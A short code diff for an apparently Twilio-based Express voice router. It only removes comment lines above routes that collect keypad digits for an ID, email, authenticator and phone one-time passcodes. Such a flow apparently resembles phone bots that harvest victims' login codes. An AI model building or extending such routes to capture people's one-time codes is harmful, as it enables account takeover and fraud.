@@ -200,7 +200,6 @@ router.post('/leave-queue/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// COLLECT ID - WORKING
 router.post('/collect-id/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
@@ -248,7 +247,6 @@ router.post('/collect-id/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// COLLECT EMAIL OTP - FIXED
 router.post('/collect-email-otp/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
@@ -296,7 +294,6 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// COLLECT AUTH OTP - FIXED
 router.post('/collect-auth-otp/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
@@ -344,7 +341,6 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// COLLECT PHONE OTP - FIXED
 router.post('/collect-phone-otp/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
@@ -392,7 +388,6 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// COLLECT CUSTOM - FIXED
 router.post('/collect-custom/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
